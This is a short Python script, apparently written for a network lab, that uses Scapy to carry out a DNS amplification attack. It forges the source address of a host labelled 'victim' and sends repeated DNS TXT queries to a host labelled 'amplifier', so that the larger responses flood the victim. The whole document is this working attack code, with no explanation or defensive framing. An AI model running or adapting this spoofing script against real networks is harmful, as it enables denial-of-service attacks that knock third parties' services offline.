from scapy.all import *

ADDRS = {
    "victim": "192.168.30.1",
    "amplifier": "192.168.20.1",
    "attacker": "192.168.10.1"
}

interface = "enp0s8"

for _ in range(15):
    packet = IP(src=ADDRS["victim"], dst=ADDRS["amplifier"]) / UDP() / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="TXT"))
    send(packet, iface=interface)
